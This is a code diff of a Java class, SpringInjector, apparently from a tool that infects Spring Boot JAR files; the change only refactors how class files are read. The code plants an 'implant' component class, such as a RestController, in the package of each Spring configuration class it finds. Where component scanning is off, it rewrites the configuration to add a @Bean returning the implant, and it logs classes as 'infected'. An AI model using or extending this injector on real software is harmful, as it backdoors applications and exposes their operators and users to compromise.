@@ -4,8 +4,6 @@ import javassist.bytecode.*;
 import javassist.bytecode.annotation.Annotation;
 import javassist.bytecode.annotation.MemberValue;
 
-import java.io.DataInputStream;
-import java.io.IOException;
 import java.util.*;
 import java.util.jar.JarEntry;
 import java.util.logging.Logger;
@@ -22,7 +20,7 @@ public class SpringInjector implements Injector {
         this.implantSpringConfigHandler = implantSpringConfigHandler;
     }
 
-    public boolean inject(JarFiddler jar) throws IOException {
+    public boolean inject(JarFiddler jar) {
         boolean didInfect = false;
         boolean foundSignedClasses = false;
 
@@ -42,55 +40,52 @@ public class SpringInjector implements Injector {
                 continue;
             }
 
-            ClassFile currentlyProcessing;
-            try (DataInputStream in = new DataInputStream(entry.getContentStream())) {
-                currentlyProcessing = new ClassFile(in);
-                ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
-                if (!isSpringConfigurationClass(currentlyProcessing)) {
+            ClassFile currentlyProcessing = readClassFile(entry.getContent());
+            ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
+            if (!isSpringConfigurationClass(currentlyProcessing)) {
+                continue;
+            }
+            log.fine("Found Spring configuration '" + entry.getName() + "'.");
+
+            /*
+             * By adding our own Spring component (like a RestController) into the JAR under the same package
+             * as the Spring config class, Spring will happily load it automatically. This is assuming that
+             * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
+             * component needs to be explicitly referenced as a @Bean in the config class.
+             */
+            ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
+            ClassName renamedImplantComponentName = ClassName.of(implantComponent).renamePackage(currentlyProcessingName);
+            implantComponent.setName(renamedImplantComponentName.getFullClassName());
+            JarEntry newJarEntry = new JarEntry(renamedImplantComponentName.getSpringJarEntryPath());
+            try {
+                jar.addNewEntry(newJarEntry, asByteArray(implantComponent));
+                countComponentsCreated++;
+            } catch (DuplicateEntryException e) {
+                log.warning("Class '" + newJarEntry + "' already exist in JAR '" + jar + "'. Skipping.");
+                break;
+            }
+            log.fine("Created implant class '" + newJarEntry.getName() + "'.");
+
+            if (!hasComponentScanEnabled(currentlyProcessing)) {
+                /*
+                 * Component Scanning seems to not be enabled for this Spring configuration.
+                 * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
+                 */
+                log.fine("Spring configuration '" + entry.getName() + "' is not set to automatically scan for components (@ComponentScan).");
+
+                ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+                Optional<ClassFile> modifiedSpringConfig = addBeanToSpringConfig(currentlyProcessing, implantSpringConfig, implantComponent);
+                if (modifiedSpringConfig.isEmpty()) {
+                    log.warning("Class '" + entry.getName() + "' already infected. Skipping.");
                     continue;
                 }
-                log.fine("Found Spring configuration '" + entry.getName() + "'.");
 
-                /*
-                 * By adding our own Spring component (like a RestController) into the JAR under the same package
-                 * as the Spring config class, Spring will happily load it automatically. This is assuming that
-                 * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
-                 * component needs to be explicitly referenced as a @Bean in the config class.
-                 */
-                ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
-                ClassName renamedImplantComponentName = ClassName.of(implantComponent).renamePackage(currentlyProcessingName);
-                implantComponent.setName(renamedImplantComponentName.getFullClassName());
-                JarEntry newJarEntry = new JarEntry(renamedImplantComponentName.getSpringJarEntryPath());
-                try {
-                    jar.addNewEntry(newJarEntry, asByteArray(implantComponent));
-                    countComponentsCreated++;
-                } catch (DuplicateEntryException e) {
-                    log.warning("Class '" + newJarEntry + "' already exist in JAR '" + jar + "'. Skipping.");
-                    break;
-                }
-                log.fine("Created implant class '" + newJarEntry.getName() + "'.");
-
-                if (!hasComponentScanEnabled(currentlyProcessing)) {
-                    /*
-                     * Component Scanning seems to not be enabled for this Spring configuration.
-                     * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
-                     */
-                    log.fine("Spring configuration '" + entry.getName() + "' is not set to automatically scan for components (@ComponentScan).");
-
-                    ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
-                    Optional<ClassFile> modifiedSpringConfig = addBeanToSpringConfig(currentlyProcessing, implantSpringConfig, implantComponent);
-                    if (modifiedSpringConfig.isEmpty()) {
-                        log.warning("Class '" + entry.getName() + "' already infected. Skipping.");
-                        continue;
-                    }
-
-                    entry.replaceContentWith(asByteArray(modifiedSpringConfig.get()));
-                    countConfigModifications++;
-                    log.fine("Injected @Bean method into '" + entry.getName() + "'.");
-                }
-
-                didInfect = true;
+                entry.replaceContentWith(asByteArray(modifiedSpringConfig.get()));
+                countConfigModifications++;
+                log.fine("Injected @Bean method into '" + entry.getName() + "'.");
             }
+
+            didInfect = true;
         }
         log.info("Modified " + countConfigModifications + " Spring configuration classes.");
         log.info("Created " + countComponentsCreated + " Spring component classes.");
